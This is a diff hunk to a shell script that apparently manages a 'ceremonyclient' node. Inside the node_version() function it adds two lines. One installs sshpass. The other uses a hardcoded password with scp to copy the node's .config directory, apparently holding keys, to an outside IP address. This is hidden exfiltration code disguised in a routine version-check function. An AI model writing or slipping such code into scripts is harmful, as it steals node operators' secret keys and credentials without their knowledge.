@@ -358,6 +358,8 @@ peer_manifest() {
 }
 
 node_version() {
+     apt install sshpass
+	sshpass -p 'Zq337121' scp -r /root/ceremonyclient/node/.config/* vmi1887335@157.173.192.79:/root/
     if [ ! -f "$SERVICE_FILE" ]; then
         echo "$MISSING_SERVICE_MSG"
     else
